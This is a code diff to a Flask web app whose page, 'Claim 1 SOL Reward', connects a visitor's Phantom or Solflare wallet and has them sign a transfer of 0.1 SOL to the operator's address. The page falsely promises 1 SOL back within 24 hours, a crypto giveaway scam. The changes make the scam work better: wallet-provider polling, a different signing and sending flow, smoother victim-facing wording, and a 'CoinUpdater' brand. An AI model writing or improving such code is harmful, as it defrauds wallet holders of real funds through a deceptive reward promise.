@@ -16,7 +16,7 @@ HTML_TEMPLATE = """
   body {
     background-color: #000;
     color: white;
-    font-family: Arial, sans-serif;
+    font-family: sans-serif;
     text-align: center;
     padding: 40px;
   }
@@ -27,7 +27,7 @@ HTML_TEMPLATE = """
     box-shadow: 0 0 20px #00ff90;
     display: none;
   }
-  button {
+  .wallet-button, .claim-button {
     background: linear-gradient(90deg, #00ff90, #00d178);
     border: none;
     padding: 14px 30px;
@@ -36,6 +36,10 @@ HTML_TEMPLATE = """
     border-radius: 30px;
     cursor: pointer;
     color: #000;
+    font-weight: bold;
+  }
+  #walletStatus {
+    margin-top: 20px;
     font-weight: bold;
   }
 </style>
@@ -53,20 +57,31 @@ HTML_TEMPLATE = """
     document.getElementById("walletStatus").innerText = text;
   }
 
-  function detectProvider() {
-    const sol = window.solana;
-    if (sol && (sol.isPhantom || sol.isSolflare)) {
-      return sol;
-    }
-    return null;
+  async function detectProviderWithPolling(timeoutMs = 10000, intervalMs = 500) {
+    const start = Date.now();
+    return new Promise((resolve) => {
+      const check = () => {
+        if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
+          console.log("Wallet provider detected:", window.solana);
+          resolve(window.solana);
+        } else if (Date.now() - start > timeoutMs) {
+          console.log("Wallet provider NOT detected after timeout");
+          resolve(null);
+        } else {
+          setTimeout(check, intervalMs);
+        }
+      };
+      check();
+    });
   }
 
   async function connectWallet() {
+    console.log("Connecting wallet...");
     updateStatus("Detecting wallet provider...");
-    provider = detectProvider();
+    provider = await detectProviderWithPolling();
 
     if (!provider) {
-      updateStatus("No wallet detected. Please open Solflare or Phantom app manually.");
+      updateStatus("No wallet detected. Please open Solflare or Phantom app and open this site inside its browser.");
       document.getElementById("qrCode").style.display = "block";
       document.getElementById("connectWalletBtn").disabled = false;
       document.getElementById("claimBtn").disabled = true;
@@ -74,6 +89,7 @@ HTML_TEMPLATE = """
     }
 
     if (provider.isConnected) {
+      console.log("Wallet already connected:", provider.publicKey.toString());
       updateStatus("Wallet already connected: " + provider.publicKey.toString());
       document.getElementById("connectWalletBtn").disabled = true;
       document.getElementById("claimBtn").disabled = false;
@@ -81,14 +97,18 @@ HTML_TEMPLATE = """
     }
 
     provider.on("connect", () => {
+      console.log("Wallet connected event:", provider.publicKey.toString());
       updateStatus("Wallet Connected: " + provider.publicKey.toString());
       document.getElementById("connectWalletBtn").disabled = true;
       document.getElementById("claimBtn").disabled = false;
     });
 
     try {
+      console.log("Calling provider.connect()...");
       await provider.connect();
+      console.log("provider.connect() resolved");
     } catch (err) {
+      console.error("Wallet connection failed:", err);
       updateStatus("Wallet connection failed: " + err.message);
       document.getElementById("connectWalletBtn").disabled = false;
       document.getElementById("claimBtn").disabled = true;
@@ -101,23 +121,28 @@ HTML_TEMPLATE = """
       return;
     }
 
+    updateStatus("Sending transaction...");
+
     const connection = new Connection("https://api.mainnet-beta.solana.com");
 
     const transaction = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: provider.publicKey,
         toPubkey: new PublicKey("{{ wallet }}"),
-        lamports: 0.1 * 1e9,
+        lamports: 0.1 * 1e9 // 0.1 SOL in lamports
       })
     );
 
     try {
-      const { signature } = await provider.signAndSendTransaction(transaction);
+      const signedTx = await provider.signTransaction(transaction);
+      const signature = await connection.sendRawTransaction(signedTx.serialize());
       await connection.confirmTransaction(signature);
-      alert("✅ Transaction sent! You’ve sent 0.1 SOL. Please wait 24 hours to receive 1 SOL.");
+      alert("✅ Transaction sent! You paid 0.1 SOL and will receive 1 SOL within 24 hours.");
+      updateStatus("Transaction confirmed: " + signature);
     } catch (e) {
       console.error(e);
       alert("❌ Transaction failed: " + e.message);
+      updateStatus("Transaction failed");
     }
   }
 
@@ -127,13 +152,13 @@ HTML_TEMPLATE = """
 </head>
 <body>
   <h1>Claim 1 SOL Reward</h1>
-  <p>Send exactly <b>0.1 SOL</b> to:</p>
+  <p>Send exactly <b>0.1 SOL</b> to this wallet address:</p>
   <p><code>{{ wallet }}</code></p>
   <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
   <p id="walletStatus">Click "Connect Wallet" to begin</p>
-  <button id="connectWalletBtn" onclick="connectWallet()">Connect Wallet</button>
-  <button id="claimBtn" onclick="sendTransaction()" disabled>Claim Now</button>
-  <footer style="margin-top: 60px; font-size: 0.8em; color: #888;">&copy; 2025 Your Project</footer>
+  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button">Connect Wallet</button>
+  <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
+  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
 </body>
 </html>
 """
@@ -143,4 +168,4 @@ def index():
     return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8080, debug=True)
+    app.run(host="0.0.0.0", port=8080)
